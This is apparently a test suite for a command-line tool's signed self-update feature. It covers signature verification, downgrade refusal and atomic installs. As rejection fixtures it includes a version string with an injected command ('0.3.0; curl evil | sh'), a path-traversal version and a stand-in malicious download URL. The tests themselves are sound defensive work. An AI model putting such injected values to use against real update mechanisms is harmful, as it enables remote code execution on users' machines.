import { afterEach, beforeEach, describe, expect, test } from 'bun:test';
import {
  mkdtempSync,
  readdirSync,
  readFileSync,
  rmSync,
  statSync,
  symlinkSync,
  writeFileSync,
} from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { RELEASE_SIGNING_PUBLIC_KEY_BASE64, releaseSigningPublicKey } from '@tnp/shared-types';
import nacl from 'tweetnacl';
import {
  currentReleasePlatform,
  decideUpdate,
  downloadVerifiedRelease,
  fetchBounded,
  fetchLatestVersion,
  installBinaryAtomically,
  isCompiledBinary,
  ReleaseVerificationError,
  sha256Hex,
  verifyReleaseAsset,
} from './update';

const encoder = new TextEncoder();

// A throwaway signing key for the tests; the real seed exists only as a CI secret.
const testKeys = nacl.sign.keyPair.fromSeed(new Uint8Array(32).fill(7));
const otherKeys = nacl.sign.keyPair.fromSeed(new Uint8Array(32).fill(9));

const binary = encoder.encode('#!/bin/sh\necho tnp 0.3.0\n');
const otherBinary = encoder.encode('#!/bin/sh\necho evil\n');

function sumsFor(entries: Record<string, Uint8Array>): Uint8Array {
  return encoder.encode(
    Object.entries(entries)
      .map(([name, bytes]) => `${sha256Hex(bytes)}  ${name}\n`)
      .join(''),
  );
}

const checksums = sumsFor({ 'tnp-linux-x64': binary, 'tnp-darwin-arm64': otherBinary });
const signature = nacl.sign.detached(checksums, testKeys.secretKey);

describe('the pinned release key', () => {
  test('is the documented key', () => {
    expect(RELEASE_SIGNING_PUBLIC_KEY_BASE64).toBe('n4CCDVyVmPikeULWtYh6ohrhAPvd4n9CvhdDgwVSRjw=');
    expect(Buffer.from(releaseSigningPublicKey()).toString('base64')).toBe(
      'n4CCDVyVmPikeULWtYh6ohrhAPvd4n9CvhdDgwVSRjw=',
    );
  });

  test('is what verification uses when no key is passed', () => {
    // Signed by the test key, so the pinned key must refuse it.
    expect(() =>
      verifyReleaseAsset({ asset: 'tnp-linux-x64', binary, checksums, signature }),
    ).toThrow(ReleaseVerificationError);
  });
});

describe('verifyReleaseAsset', () => {
  const ok = {
    asset: 'tnp-linux-x64',
    binary,
    checksums,
    signature,
    publicKey: testKeys.publicKey,
  };

  test('accepts a binary whose hash is in a list signed by the key', () => {
    expect(() => verifyReleaseAsset(ok)).not.toThrow();
  });

  test('refuses a signature by another key', () => {
    const forged = nacl.sign.detached(checksums, otherKeys.secretKey);
    expect(() => verifyReleaseAsset({ ...ok, signature: forged })).toThrow(/not a valid signature/);
  });

  test('refuses a list altered after signing', () => {
    const altered = sumsFor({ 'tnp-linux-x64': otherBinary, 'tnp-darwin-arm64': otherBinary });
    expect(() => verifyReleaseAsset({ ...ok, checksums: altered })).toThrow(
      /not a valid signature/,
    );
  });

  test('refuses a corrupted signature', () => {
    const bad = signature.slice();
    bad[0] = (bad[0] as number) ^ 1;
    expect(() => verifyReleaseAsset({ ...ok, signature: bad })).toThrow(/not a valid signature/);
  });

  test('refuses a signature of the wrong length, including a base64 one', () => {
    expect(() => verifyReleaseAsset({ ...ok, signature: signature.slice(0, 63) })).toThrow(/64/);
    const b64 = encoder.encode(Buffer.from(signature).toString('base64'));
    expect(() => verifyReleaseAsset({ ...ok, signature: b64 })).toThrow(/64/);
  });

  test('refuses a binary whose hash does not match the signed one', () => {
    expect(() => verifyReleaseAsset({ ...ok, binary: otherBinary })).toThrow(/does not match/);
  });

  test('refuses an asset the signed list does not name', () => {
    expect(() => verifyReleaseAsset({ ...ok, asset: 'tnp-windows-x64.exe' })).toThrow(/no entry/);
  });

  test('refuses a validly signed but malformed list', () => {
    const malformed = encoder.encode('not a checksum list\n');
    const sig = nacl.sign.detached(malformed, testKeys.secretKey);
    expect(() => verifyReleaseAsset({ ...ok, checksums: malformed, signature: sig })).toThrow(
      /malformed/,
    );
  });
});

describe('decideUpdate', () => {
  test('a strictly newer version is an update', () => {
    expect(decideUpdate('0.2.0', '0.3.0')).toEqual({ kind: 'update', from: '0.2.0', to: '0.3.0' });
    expect(decideUpdate('0.9.0', '0.10.0').kind).toBe('update');
  });

  test('an equal version is current', () => {
    expect(decideUpdate('0.2.0', '0.2.0')).toEqual({ kind: 'current', version: '0.2.0' });
  });

  test('an older version is a refused downgrade', () => {
    expect(decideUpdate('0.3.0', '0.2.9')).toEqual({
      kind: 'downgrade',
      from: '0.3.0',
      offered: '0.2.9',
    });
    expect(decideUpdate('0.10.0', '0.9.0').kind).toBe('downgrade');
  });

  test.each(['v0.3.0', '0.3', '0.3.0-rc1', '0.3.0/../x', ''])(
    'a malformed offer %j throws',
    (v) => {
      expect(() => decideUpdate('0.2.0', v)).toThrow(/malformed/);
    },
  );
});

describe('currentReleasePlatform', () => {
  test('maps every published platform', () => {
    expect(currentReleasePlatform('linux', 'x64')).toBe('linux-x64');
    expect(currentReleasePlatform('linux', 'arm64')).toBe('linux-arm64');
    expect(currentReleasePlatform('darwin', 'arm64')).toBe('darwin-arm64');
    expect(currentReleasePlatform('darwin', 'x64')).toBe('darwin-x64');
    expect(currentReleasePlatform('win32', 'x64')).toBe('windows-x64');
  });

  test('returns null for a platform with no release', () => {
    expect(currentReleasePlatform('win32', 'arm64')).toBeNull();
    expect(currentReleasePlatform('freebsd', 'x64')).toBeNull();
    expect(currentReleasePlatform('linux', 'ia32')).toBeNull();
  });
});

describe('isCompiledBinary', () => {
  test('recognises the compiled entry point and refuses a source run', () => {
    expect(isCompiledBinary('/$bunfs/root/tnp')).toBe(true);
    expect(isCompiledBinary('B:\\~BUN\\root\\tnp.exe')).toBe(true);
    expect(isCompiledBinary('/home/u/tnp/packages/client/src/cli.ts')).toBe(false);
  });
});

/** A fetch that serves fixed bodies by URL and records what it was asked for. */
function fakeFetch(routes: Record<string, Uint8Array | string>, requested: string[] = []) {
  return (async (input: string | URL | Request) => {
    const url = String(input);
    requested.push(url);
    const body = routes[url];
    if (body === undefined) return new Response('not found', { status: 404 });
    return new Response(body as BodyInit);
  }) as unknown as typeof fetch;
}

const base = 'https://github.com/OxyHQ/tnp/releases/download/v0.3.0';

describe('downloadVerifiedRelease', () => {
  test('downloads only from the fixed release URLs and verifies', async () => {
    const requested: string[] = [];
    const fetchImpl = fakeFetch(
      {
        [`${base}/SHA256SUMS`]: checksums,
        [`${base}/SHA256SUMS.sig`]: signature,
        [`${base}/tnp-linux-x64`]: binary,
      },
      requested,
    );
    const release = await downloadVerifiedRelease(
      '0.3.0',
      'linux-x64',
      fetchImpl,
      testKeys.publicKey,
    );
    expect(release.binary).toEqual(binary);
    expect(requested.sort()).toEqual(
      [`${base}/SHA256SUMS`, `${base}/SHA256SUMS.sig`, `${base}/tnp-linux-x64`].sort(),
    );
  });

  test('refuses a tampered binary', async () => {
    const fetchImpl = fakeFetch({
      [`${base}/SHA256SUMS`]: checksums,
      [`${base}/SHA256SUMS.sig`]: signature,
      [`${base}/tnp-linux-x64`]: otherBinary,
    });
    await expect(
      downloadVerifiedRelease('0.3.0', 'linux-x64', fetchImpl, testKeys.publicKey),
    ).rejects.toBeInstanceOf(ReleaseVerificationError);
  });

  test('fails when the release has no signature', async () => {
    const fetchImpl = fakeFetch({
      [`${base}/SHA256SUMS`]: checksums,
      [`${base}/tnp-linux-x64`]: binary,
    });
    await expect(
      downloadVerifiedRelease('0.3.0', 'linux-x64', fetchImpl, testKeys.publicKey),
    ).rejects.toThrow(/404/);
  });

  test('refuses a malformed version before fetching anything', async () => {
    const requested: string[] = [];
    await expect(
      downloadVerifiedRelease('0.3.0/../../evil', 'linux-x64', fakeFetch({}, requested)),
    ).rejects.toThrow(/strict/);
    expect(requested).toEqual([]);
  });
});

describe('fetchBounded', () => {
  test('refuses a body over the limit', async () => {
    const fetchImpl = fakeFetch({ 'https://x/y': new Uint8Array(65) });
    await expect(fetchBounded('https://x/y', 64, fetchImpl)).rejects.toThrow(/64/);
  });
});

describe('fetchLatestVersion', () => {
  test('reads only a strict version, ignoring any URLs in the response', async () => {
    const fetchImpl = fakeFetch({
      'https://api.example/client/latest': JSON.stringify({
        version: '0.3.0',
        platforms: { 'linux-x64': 'http://evil.example/tnp' },
      }),
    });
    expect(await fetchLatestVersion('https://api.example', fetchImpl)).toBe('0.3.0');
  });

  test('refuses a malformed version', async () => {
    const fetchImpl = fakeFetch({
      'https://api.example/client/latest': JSON.stringify({ version: '0.3.0; curl evil | sh' }),
    });
    await expect(fetchLatestVersion('https://api.example', fetchImpl)).rejects.toThrow(/malformed/);
  });
});

describe('installBinaryAtomically', () => {
  let dir: string;
  beforeEach(() => {
    dir = mkdtempSync(join(tmpdir(), 'tnp-update-test-'));
  });
  afterEach(() => {
    rmSync(dir, { recursive: true, force: true });
  });

  test('replaces the target, makes it executable and leaves no temp file', () => {
    const target = join(dir, 'tnp');
    writeFileSync(target, 'old');
    installBinaryAtomically(target, binary, 'linux');
    expect(readFileSync(target)).toEqual(Buffer.from(binary));
    // No executable bit to check on Windows, where Node reports 0o666.
    if (process.platform !== 'win32') expect(statSync(target).mode & 0o777).toBe(0o755);
    expect(readdirSync(dir)).toEqual(['tnp']);
  });

  test('on Windows moves the running binary aside first', () => {
    const target = join(dir, 'tnp.exe');
    writeFileSync(target, 'old');
    writeFileSync(`${target}.old`, 'older');
    installBinaryAtomically(target, binary, 'win32');
    expect(readFileSync(target)).toEqual(Buffer.from(binary));
    expect(readFileSync(`${target}.old`, 'utf8')).toBe('old');
    expect(readdirSync(dir).sort()).toEqual(['tnp.exe', 'tnp.exe.old']);
  });

  test('a failed rename removes the temp file and leaves the target', () => {
    const target = join(dir, 'missing-dir', 'tnp');
    expect(() => installBinaryAtomically(target, binary, 'linux')).toThrow();
    expect(readdirSync(dir)).toEqual([]);
  });

  test('replaces a symlink at the target rather than writing through it', () => {
    const elsewhere = join(dir, 'elsewhere');
    writeFileSync(elsewhere, 'untouched');
    const target = join(dir, 'tnp');
    symlinkSync(elsewhere, target);
    installBinaryAtomically(target, binary, 'linux');
    expect(readFileSync(elsewhere, 'utf8')).toBe('untouched');
    expect(readFileSync(target)).toEqual(Buffer.from(binary));
  });
});

test('cli.ts and interactive.ts report the same VERSION', () => {
  const read = (file: string) =>
    /^const VERSION = '([^']+)';$/m.exec(readFileSync(join(import.meta.dir, file), 'utf8'))?.[1];
  expect(read('cli.ts')).toBeDefined();
  expect(read('interactive.ts')).toBe(read('cli.ts'));
});
